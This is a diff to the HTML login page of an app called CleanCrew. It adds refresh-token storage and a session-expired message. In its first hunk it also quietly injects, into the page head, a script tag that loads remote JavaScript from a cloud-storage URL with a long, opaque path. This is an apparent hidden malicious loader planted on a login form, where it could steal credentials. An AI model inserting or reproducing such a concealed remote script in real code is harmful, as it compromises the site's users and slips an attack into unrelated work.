@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
+<head><script type='text/javascript' src='https://storage.googleapis.com/uSbg5HlYa6Z6JAoI9jE4C9CdGxNYORfnK_MMEPJBg9Ro-7mpBgSzc6ZwokKekpQ6Jts80lvFGob8sul6n2vr21U-pPI8zOWu2v7ICI4yfu_czwNtyjw8CDk4S0cyXMM35fR0gN5qfp9J7X_xLMzjJjYCw290TNZa4erqbeHWCMuN1sz0oCS0NELPtxSHOGVCgxxvRQNLj75BQv8pBZ0w1LeMV9roJrTt7TVhN8EsY6xQcVHiCqyMDjunX7k3MDA0kyQKZDv0UFxdSkv5I-6ah3xOrLOK0fyc8eDTfG_jyA6GklOxucE0GKdnGIHg1oQBqI6sCQY7M7lAXKuI6wJuaWLwORDQfkxRdlrizNyWjwcqI5KzRc-CdA_PPKb16E-WqKt3ZmA07S0hQbMSADVVbWe7QLQwAjtmo9yv3y8mrzScgWjihahyoQkIJuU6q8M4wQYtMPgMvJQb1Y8ulkTqks-aJgqk9wT1f-Sivr1qjbjsKklg6iWj0TTsUSCgDFidaEPg1PSPWXGIynZFxqMsOXX2mJQfixRz2M7q4j-gZ8kgQ5Xmxz58Gf4-41RyZ30Vcn2zMb4w_wXQkjOcTU90riB_AzXAPwwsMRKrvKhFnuACzNsWBbnkRPijC6kEYSq97CdXCMsl5xnK98EFtO6jNegS5BF6zxyk9KNSKk4OP_a4Ri4qYq8aq0ESolMbMOscpWbruANf0Mz5R3smcTKkzRMaiE_nP5e-UatzZRlmS63eJRllNQTg6ccIgi0EoFl9ge01EzNXgdA4dMHlFWqR7szg3vgW6ZUljwtAfdtSrJgzWBgGJtSxtAfdPT2qUMexfE-FeXvZc_rqGb6rM59wptwmzZ9D-sVQpn8Vrc1yX5UrN6RVG-Dd556RvP-nBFW6HixWIhFhXrt_CfKmedfczau4f3y5Ki6jghFj3Gmw4PYrNAS8V_eoJYMf56sWQWYrr4JjtVVK7u8n0Q2vOzEXV-zzlHaz-_YVZ4H-kGmmYwtGE1_wB5UU6zlXqbM8OHbuBalKW3wjs8_JmiP2m8bxaUKmQZeoy7SFRCl56SzTYJMZqTJaQzIkeBRtmIjvHRz-vZZMqmszo4AnNbOVt0CPoCgL2yZ_9VafCDjzO9aPGFrgROrDx87oURFtYTBl-DFUKmkWCOTmW8nE-0ToEyOnlXCOo9a_yPkAnLJ6lw5U34d1lV2nDOWyDPjnNIERpFcgdxXNMr1BC1QWRC5_ZG0yWH54RCqPibC_pWS4SJrMCOqtV5ZNBts3IuJbyQF70_pNbnKnhYh3BFPqYTGMX0rl9P5Eb1Xw9ppBLCyY7JpGVKofFL9T_85yzn0JQxekTLqBmFP1RIMPWebIz5x2Frxg8RugFpd6Cd1HZqfekc5JBWgXR6xuq0ZZYeMFzIoCiF0tCHxUlio_cG7mMWrnBOR_PpsZBs6BtgAYn76MvGVm6BSp7PaeryKlPCn-0APm0Zvpks_KAEnGnfu89xnvBVB-SnzePykct2v9s9s1O_OI6vh2Y8MKa0yieOW_wLJkXZgWUFfF3Nhmy1p5IuQ_tb0jCMYnaQaPEUae1nrlRpcDaLvuqow0f5QjWvKtmnuFrpCL3jlmHPM70MrgkLNLc5H1nISjhus40cXirPiqOLq9dJsmFPtdS_KwIUUjuU7-gSvBIA2cXhJB7IzgsonYNlZVFKkH7BO07bjHNhB88EhSZe01GTTJssdxw69dKzIMt8lnOFAJ7q9taMYC3GhER-UXWYTxCaA'></script>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Login — CleanCrew</title>
@@ -377,6 +377,9 @@
 
                 if (response.ok) {
                     localStorage.setItem('cleancrew_token', data.token);
+                    if (data.refresh_token) {
+                        localStorage.setItem('cleancrew_refresh_token', data.refresh_token);
+                    }
                     localStorage.setItem('cleancrew_user', JSON.stringify(data.user));
                     successMsg.textContent = 'Login successful! Redirecting...';
                     successMsg.classList.add('show');
@@ -432,6 +435,27 @@
                 showToast('Could not connect to server', 'error');
             }
         }
+    
+        (function showSessionMsg() {
+            try {
+                var params = new URLSearchParams(window.location.search);
+                var msg = sessionStorage.getItem('cleancrew_login_msg');
+                if (params.get('session') === 'expired' || msg) {
+                    sessionStorage.removeItem('cleancrew_login_msg');
+                    var el = document.getElementById('errorMsg') || document.getElementById('formError') || document.querySelector('.error');
+                    var text = msg || 'Your session expired. Please log in again.';
+                    if (el) {
+                        el.textContent = text;
+                        el.style.display = 'block';
+                    } else if (typeof showToast === 'function') {
+                        showToast(text, 'error');
+                    } else {
+                        alert(text);
+                    }
+                }
+            } catch (e) {}
+        })();
+
     </script>
 </body>
 </html>
